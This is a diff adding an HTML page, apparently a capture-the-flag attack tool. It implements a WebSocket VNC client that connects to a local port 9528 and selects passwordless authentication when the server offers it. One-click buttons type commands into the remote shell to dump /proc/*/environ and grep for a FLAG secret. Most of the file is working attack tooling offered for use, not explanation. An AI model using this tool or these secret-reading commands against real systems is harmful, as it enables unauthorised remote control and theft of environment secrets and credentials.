@@ -1,0 +1,231 @@
+<!doctype html>
+<html lang="zh">
+<head>
+<meta charset="utf-8">
+<title>vnc</title>
+<style>
+  body{font-family:monospace;background:#0b0b0b;color:#ddd;padding:12px;font-size:13px;margin:0}
+  h2{color:#6cf;margin:10px 0 4px}
+  #log{white-space:pre-wrap;word-break:break-all;background:#151515;padding:6px;border-left:3px solid #444;max-height:180px;overflow:auto;font-size:12px}
+  .ok{color:#3f6}.err{color:#c66}.info{color:#fc6}.warn{color:#f96}
+  #cv{border:2px solid #555;background:#000;display:block;max-width:100%;height:auto;image-rendering:pixelated}
+  .bar{display:flex;flex-wrap:wrap;gap:6px;align-items:center;margin:6px 0}
+  input[type=text]{flex:1;min-width:240px;background:#222;color:#eee;border:1px solid #444;padding:6px;font-family:monospace}
+  button{background:#333;color:#eee;border:1px solid #555;padding:6px 10px;cursor:pointer;font-family:monospace}
+  button:hover{background:#444}
+  .cmd{background:#1a3a1a}
+</style>
+</head>
+<body>
+<h2>RFB/VNC over WebSocket → 9528</h2>
+<div id="log"></div>
+<h2>Desktop</h2>
+<canvas id="cv" width="1280" height="1024"></canvas>
+<div class="bar">
+  <input type="text" id="txt" value="cat /proc/self/environ" spellcheck="false">
+  <button onclick="doSend()">发送+回车</button>
+  <button class="cmd" onclick="quick('cat /proc/self/environ')">cat /proc/self/environ</button>
+  <button class="cmd" onclick="quick('cat /proc/1/environ')">cat /proc/1/environ</button>
+  <button class="cmd" onclick="quick('env')">env</button>
+  <button class="cmd" onclick="quick('printenv FLAG')">printenv FLAG</button>
+  <button class="cmd" onclick="quick(\"cat /proc/*/environ 2>/dev/null | tr '\\\\0' '\\\\n' | grep -i flag\")">grep flag in /proc/*/environ</button>
+</div>
+<div class="bar">
+  <button onclick="sendKey(0xFF0D,1);sendKey(0xFF0D,0)">Enter</button>
+  <button onclick="sendKey(0xFF08,1);sendKey(0xFF08,0)">⌫</button>
+  <button onclick="sendKey(0xFF09,1);sendKey(0xFF09,0)">Tab</button>
+  <button onclick="sendKey(0xFF1B,1);sendKey(0xFF1B,0)">Esc</button>
+  <button onclick="ctrlC()">Ctrl+C</button>
+  <button onclick="sendKey(0xFF52,1);sendKey(0xFF52,0)">↑</button>
+  <button onclick="sendKey(0xFF54,1);sendKey(0xFF54,0)">↓</button>
+  <button onclick="document.getElementById('log').textContent=''">清日志</button>
+  <span id="st" style="color:#fc6"></span>
+</div>
+
+<script>
+const $=s=>document.querySelector(s);
+const logEl=$('#log'), stEl=$('#st');
+function log(c,m){const d=document.createElement('div');d.className=c;d.textContent=m;logEl.appendChild(d);logEl.scrollTop=logEl.scrollHeight;}
+function st(m){stEl.textContent=m;}
+
+const cv=$('#cv'), ctx=cv.getContext('2d');
+let ws, buf=new Uint8Array(0), step=0, fbW=1280, fbH=1024, authNeeded=false;
+
+function push(d){const n=new Uint8Array(buf.length+d.length);n.set(buf);n.set(d,buf.length);buf=n;}
+const u16=(a,i)=>(a[i]<<8)|a[i+1];
+const u32=(a,i)=>(a[i]<<24)|(a[i+1]<<16)|(a[i+2]<<8)|a[i+3];
+function send(b){if(ws&&ws.readyState===1) ws.send(b);}
+function strBytes(s){const a=new Uint8Array(s.length);for(let i=0;i<s.length;i++)a[i]=s.charCodeAt(i);return a;}
+
+// —— RFB 消息构造 ——
+function sendPixelFormat(){
+  const b=new Uint8Array(20);
+  b[0]=0; b[4]=32; b[5]=24; b[6]=0; b[7]=1;
+  b[9]=255; b[11]=255; b[13]=255;        // red/green/blue max=255 (LE)
+  b[14]=16; b[15]=8; b[16]=0;            // shifts
+  send(b);
+}
+function sendEncodings(){
+  const b=new Uint8Array(8);
+  b[0]=2; b[3]=1; b[7]=0;                // 1 encoding: raw(0)
+  send(b);
+}
+function requestFb(incr,x,y,w,h){
+  const b=new Uint8Array(10);
+  b[0]=3; b[1]=incr?1:0;
+  b[2]=(x>>8)&0xff; b[3]=x&0xff;
+  b[4]=(y>>8)&0xff; b[5]=y&0xff;
+  b[6]=(w>>8)&0xff; b[7]=w&0xff;
+  b[8]=(h>>8)&0xff; b[9]=h&0xff;
+  send(b);
+}
+function sendKey(ks,down){const b=new Uint8Array(8);b[0]=4;b[1]=down?1:0;b[4]=(ks>>>24)&0xff;b[5]=(ks>>>16)&0xff;b[6]=(ks>>>8)&0xff;b[7]=ks&0xff;send(b);}
+function sendPtr(x,y,mask){const b=new Uint8Array(6);b[0]=5;b[1]=mask;b[2]=(x>>8)&0xff;b[3]=x&0xff;b[4]=(y>>8)&0xff;b[5]=y&0xff;send(b);}
+
+// raw 像素解码：32bpp little-endian → 字节序 [B,G,R,X]
+function drawRaw(x,y,w,h,data,off){
+  const img=ctx.createImageData(w,h);
+  const n=w*h;
+  for(let i=0;i<n;i++){
+    const p=off+i*4;
+    img.data[i*4]=data[p+2];     // R
+    img.data[i*4+1]=data[p+1];   // G
+    img.data[i*4+2]=data[p];     // B
+    img.data[i*4+3]=255;
+  }
+  ctx.putImageData(img,x,y);
+}
+
+function pump(){
+  let prog=true;
+  while(prog){
+    prog=false;
+    if(step===0){                                  // 等 RFB 版本
+      if(buf.length<13) break;
+      log('info','RFB version: '+String.fromCharCode.apply(null,buf.slice(0,13)));
+      buf=buf.slice(13);
+      send(strBytes('RFB 003.008\n'));
+      step=1; prog=true;
+    } else if(step===1){                           // 安全类型
+      if(buf.length<1) break;
+      const n=buf[0];
+      if(n===0){
+        if(buf.length<5) break;
+        const rl=u32(buf,1);
+        if(buf.length<5+rl) break;
+        log('err','VNC 拒绝: '+String.fromCharCode.apply(null,buf.slice(5,5+rl)));
+        st('VNC 拒绝连接'); return;
+      }
+      if(buf.length<1+n) break;
+      const types=[...buf.slice(1,1+n)];
+      log('info','security types: '+types.join(','));
+      buf=buf.slice(1+n);
+      let sel=-1;
+      if(types.includes(1)) sel=1;            // None
+      else if(types.includes(16)) sel=16;
+      else if(types.includes(2)) sel=2;        // VNC Auth（需要密码）
+      else sel=types[0];
+      send(new Uint8Array([sel]));
+      log('info','selected security type: '+sel+(sel===1?' (None,无密码)':''));
+      step = (sel===1)?2 : 9;
+      if(sel===2){ authNeeded=true; log('warn','需要 VNC 密码！此路可能不通'); }
+      prog=true;
+    } else if(step===2){                           // SecurityResult
+      if(buf.length<4) break;
+      const r=u32(buf,0); buf=buf.slice(4);
+      log('info','security result: '+r);
+      if(r!==0){ log('err','AUTH FAILED'); st('认证失败'); return; }
+      send(new Uint8Array([1]));                   // ClientInit shared=1
+      step=3; prog=true;
+    } else if(step===3){                           // ServerInit
+      if(buf.length<24) break;
+      fbW=u16(buf,0); fbH=u16(buf,2);
+      const nl=u32(buf,20);
+      if(buf.length<24+nl) break;
+      const name=String.fromCharCode.apply(null,buf.slice(24,24+nl));
+      log('ok','ServerInit: '+fbW+'x'+fbH+'  desktop="'+name+'"');
+      buf=buf.slice(24+nl);
+      cv.width=fbW; cv.height=fbH;
+      sendPixelFormat(); sendEncodings();
+      requestFb(0,0,0,fbW,fbH,0);
+      step=4; st('已连接，桌面加载中…'); prog=true;
+    } else if(step===4){                           // 服务器消息循环
+      if(buf.length<1) break;
+      const t=buf[0];
+      if(t===0){                                   // FramebufferUpdate
+        if(buf.length<4) break;
+        const rects=u16(buf,2);
+        let off=4, ok=true;
+        const list=[];
+        for(let i=0;i<rects;i++){
+          if(buf.length<off+12){ok=false;break;}
+          const x=u16(buf,off),y=u16(buf,off+2),w=u16(buf,off+4),h=u16(buf,off+6),enc=u32(buf,off+8);
+          let dl=0;
+          if(enc===0) dl=w*h*4;
+          else if(enc===1) dl=4;                   // CopyRect
+          else { log('warn','unsupported enc='+enc+' @rect'+i); ok=false; break; }
+          list.push({x,y,w,h,enc,doff:off+12,dl});
+          off+=12+dl;
+        }
+        if(!ok) break;
+        if(buf.length<off) break;                  // 数据未到齐，等
+        for(const r of list) if(r.enc===0) drawRaw(r.x,r.y,r.w,r.h,buf,r.doff);
+        buf=buf.slice(off);
+        requestFb(1,0,0,fbW,fbH,1);                // 请求增量
+        prog=true; st('桌面已更新 '+fbW+'x'+fbH);
+      } else if(t===1){                            // SetColourMapEntries
+        if(buf.length<5) break;
+        const n=u16(buf,2); const need=5+n*6;
+        if(buf.length<need) break;
+        buf=buf.slice(need); prog=true;
+      } else if(t===2){                            // Bell
+        buf=buf.slice(1); prog=true;
+      } else if(t===3){                            // ServerCutText
+        if(buf.length<8) break;
+        const len=u32(buf,4);
+        if(buf.length<8+len) break;
+        buf=buf.slice(8+len); prog=true;
+      } else {
+        log('warn','unknown server msg type='+t);
+        buf=buf.slice(1); prog=true;
+      }
+    } else if(step===9){
+      break;                                       // 等密码处理（暂不支持）
+    }
+  }
+}
+
+function connect(){
+  log('info','连接 ws://127.0.0.1:9528/ ...');
+  ws=new WebSocket('ws://127.0.0.1:9528/');
+  ws.binaryType='arraybuffer';
+  ws.onopen=()=>log('ok','WS open');
+  ws.onmessage=(e)=>{push(new Uint8Array(e.data));pump();};
+  ws.onerror=()=>log('err','WS error');
+  ws.onclose=(e)=>log('err','WS close code='+e.code+' reason='+e.reason);
+}
+connect();
+
+// —— 输入 ——
+async function sendText(s){
+  for(const ch of s){
+    const ks=ch.charCodeAt(0);                     // Latin-1 keysym
+    sendKey(ks,1); sendKey(ks,0);
+    await new Promise(r=>setTimeout(r,12));
+  }
+}
+function doSend(){const t=$('#txt').value; sendText(t).then(()=>{sendKey(0xFF0D,1);sendKey(0xFF0D,0);});}
+function quick(s){$('#txt').value=s; sendText(s).then(()=>{sendKey(0xFF0D,1);sendKey(0xFF0D,0);});}
+function ctrlC(){sendKey(0xFFE3,1);sendKey(0x63,1);sendKey(0x63,0);sendKey(0xFFE3,0);}
+
+// 点击 canvas → 移动+点击鼠标，聚焦窗口
+cv.onclick=(e)=>{
+  const r=cv.getBoundingClientRect();
+  const x=Math.round((e.clientX-r.left)/r.width*fbW);
+  const y=Math.round((e.clientY-r.top)/r.height*fbH);
+  sendPtr(x,y,0); sendPtr(x,y,1); sendPtr(x,y,0);
+};
+$('#txt').addEventListener('keydown',(e)=>{if(e.key==='Enter')doSend();});
+</script>
+</body>
+</html>
